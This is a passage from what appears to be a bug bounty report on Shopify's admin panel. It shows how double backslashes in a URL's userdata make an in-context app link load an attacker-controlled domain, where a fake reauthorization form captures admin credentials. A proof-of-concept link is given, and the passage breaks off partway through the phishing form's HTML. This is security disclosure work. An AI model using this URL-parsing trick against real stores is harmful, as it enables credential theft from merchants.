The problem however is that userdata inside the URL is allowed. By utilizing two backslashes `\\\\` in the userdata, we're able to make all browsers except Safari load the URL before the `@` instead of the domain after. This means that since the `API.modal.open` triggers directly when the victim accesses the page, we can fake a login page on this URL to make the admin think they need to reauthorize in Shopify. However, the link is actually loaded from a different domain and the credentials will be stolen whenever the admins uses the form.\n\nThe same thing applies here as to the Twine-report, the attacker needs to use a product-ID that exists for the merchant. But since these IDs are publicly available in the webstore, this should be no issue.\n\n### PoC\n\nPoC-link (use your own store, and also replace `1557454323768` with a working Product ID inside your store):\n\n```\n/admin/products/1557454323768?incontext_app_link=https%3A%2F%2F████████%5C%5C%40google-shopping.shopifycloud.com\n```\n\nThe following HTML is loaded from `██████`:\n\n\n```html\n\u003ccenter\u003e\n\u003cform onsubmit=\"alert('your login is: ' + document.getElementById('u').value + ':' + document.getElementById('p').value);
